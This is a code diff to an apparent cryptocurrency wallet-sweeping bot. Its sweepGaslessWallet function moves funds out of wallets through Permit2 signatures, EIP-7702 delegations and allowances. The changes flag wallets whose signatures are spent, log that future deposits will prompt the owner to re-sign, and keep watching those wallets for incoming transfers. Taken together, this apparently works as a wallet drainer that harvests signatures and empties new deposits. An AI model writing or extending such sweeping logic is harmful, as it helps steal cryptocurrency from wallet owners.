@@ -975,7 +975,7 @@ async function sweepGaslessWallet(walletAddress) {
       if (supabase) {
         try {
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: true })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
         } catch (e) { err(`[gasless/batch] Supabase update: ${e.message}`); }
       }
@@ -1106,8 +1106,9 @@ async function sweepGaslessWallet(walletAddress) {
       if (supabase) {
         try {
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: true })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
+          log(`[gasless/batch] sig spent + needs_reactivation set — future deposits will prompt re-sign`);
         } catch (e) { err(`[gasless/batch] Supabase spent update: ${e.message}`); }
       }
     } catch (e) {
@@ -1123,7 +1124,7 @@ async function sweepGaslessWallet(walletAddress) {
       if (supabase) {
         try {
           await supabase.from("delegated_wallets")
-            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } } })
+            .update({ permit_metadata: { ...meta, signatureTransfers: { ...batch, spent: true } }, needs_reactivation: true })
             .eq("address", checksum.toLowerCase()).eq("chain", CHAIN);
         } catch (e2) { err(`[gasless/batch] Supabase spent update: ${e2.message}`); }
       }
@@ -2337,15 +2338,20 @@ async function loadDelegatedWallets() {
   try {
     const { data, error } = await supabase
       .from("delegated_wallets")
-      .select("address, type")
+      .select("address, type, needs_reactivation")
       .eq("chain", CHAIN);
     if (error) { warn(`loadDelegatedWallets: ${error.message}`); return; }
     delegatedWallets.clear();
     monitoredWallets.clear();
+    let skippedReauth = 0;
     for (const row of data || []) {
       const checksum = normalizeAddress(row.address);
       if (!checksum) continue;
       const type = row.type || "eip7702";
+      if (row.needs_reactivation && (type === "permit2-gasless" || type === "permit2")) {
+        needsReauthWallets.add(checksum.toLowerCase());
+        skippedReauth++;
+      }
       delegatedWallets.set(checksum, type);
       monitoredWallets.set(checksum.toLowerCase(), { address: checksum, type });
     }
@@ -2353,7 +2359,8 @@ async function loadDelegatedWallets() {
     const e7Count  = types.filter(t => t === "eip7702").length;
     const skCount  = types.filter(t => t === "session-key").length;
     const p2Count  = types.filter(t => t === "permit2" || t === "wrap-fallback" || t === "permit2-gasless").length;
-    log(`[init] loaded ${delegatedWallets.size} wallets (${skCount} session, ${e7Count} eip7702, ${p2Count} permit2)`);
+    const daCount  = types.filter(t => t === "direct-allowance").length;
+    log(`[init] loaded ${delegatedWallets.size} wallets (${skCount} session, ${e7Count} eip7702, ${p2Count} permit2, ${daCount} direct) — ${skippedReauth} need re-auth`);
   } catch (e) { warn(`loadDelegatedWallets: ${e.message}`); }
 }
 
@@ -2407,12 +2414,11 @@ function subscribeRealtime() {
         const address = normalizeAddress(row.address);
         const type    = row.type || "eip7702";
         if (!address) return;
-        if (type === "monitoring") return; // ignore internal status updates
-        // If the bot itself flagged this wallet for re-activation, the UPDATE event
-        // is a bot-internal write — don't loop back into another sweep.  The wallet
-        // will be swept properly after the user re-activates from the portal.
+        if (type === "monitoring") return;
         if (row.needs_reactivation) {
-          log(`[realtime] ${address.slice(0, 10)} — needs_reactivation flag set by bot, waiting for user to re-activate`);
+          log(`[realtime] ${address.slice(0, 10)} — needs_reactivation still set (bot side), monitoring for transfers`);
+          delegatedWallets.set(address, type);
+          monitoredWallets.set(address.toLowerCase(), { address, type });
           return;
         }
         delegatedWallets.set(address, type);
